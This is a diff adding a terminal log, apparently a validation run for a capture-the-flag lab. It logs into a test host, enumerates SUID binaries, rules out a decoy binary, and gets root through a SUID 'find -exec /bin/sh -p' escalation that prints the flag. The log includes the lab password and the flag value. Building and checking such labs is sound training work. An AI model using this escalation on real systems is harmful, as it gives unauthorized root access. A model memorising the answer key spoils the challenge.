@@ -1,0 +1,92 @@
+[connected] 192.168.204.178:22001 as player (password Player@2026)
+
+========================================================================
+## whoami / id
+player@lx01:~$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+[rc=0]
+
+========================================================================
+## 当前目录与家目录
+player@lx01:~$ pwd; ls -a ~
+/home/player
+.
+..
+.bash_logout
+.bashrc
+.cache
+.profile
+[rc=0]
+
+========================================================================
+## 站点目录
+player@lx01:~$ ls -l /srv/www /srv/www/uploads
+/srv/www:
+total 4
+drwxr-xr-x 2 root root 4096 Nov 19 00:10 uploads
+
+/srv/www/uploads:
+total 4
+-rw-r--r-- 1 root root 31 Nov 19 00:10 access.log
+[rc=0]
+
+========================================================================
+## 本地 bin 目录
+player@lx01:~$ ls -la /usr/local/bin/
+total 220
+drwxr-xr-x 1 root root   4096 Nov 19 00:10 .
+drwxr-xr-x 1 root root   4096 Nov 10 04:28 ..
+-rwsr-xr-x 1 root root 204264 Mar 11  2024 find
+-rwsr-xr-x 1 root root     33 Nov 19 00:10 healthcheck
+[rc=0]
+
+========================================================================
+## 全盘 SUID
+player@lx01:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/local/bin/healthcheck
+/usr/local/bin/find
+[rc=1]
+
+========================================================================
+## 直接读 flag（负向）
+player@lx01:~$ cat /flag.txt
+[stderr] cat: /flag.txt: Permission denied
+[rc=1]
+
+========================================================================
+## 运行干扰项 healthcheck（负向）
+player@lx01:~$ /usr/local/bin/healthcheck; echo rc=$?
+health check ok
+rc=0
+[rc=0]
+
+========================================================================
+## 干扰项是否真能提权（负向）
+player@lx01:~$ /usr/local/bin/healthcheck -c 'id' 2>&1; id
+health check ok
+uid=1001(player) gid=1001(player) groups=1001(player)
+[rc=0]
+
+========================================================================
+## SUID find 不带 -p（负向）
+player@lx01:~$ /usr/local/bin/find /tmp -maxdepth 0 -exec /bin/sh -c 'id; echo shell_without_p' \; 2>&1
+uid=1001(player) gid=1001(player) groups=1001(player)
+shell_without_p
+[rc=0]
+
+========================================================================
+## SUID find 带 -p（正向）
+player@lx01:~$ /usr/local/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'id; cat /flag.txt' \; 2>&1
+uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player)
+Ly_Flag{pmam7uzn}
+[rc=0]
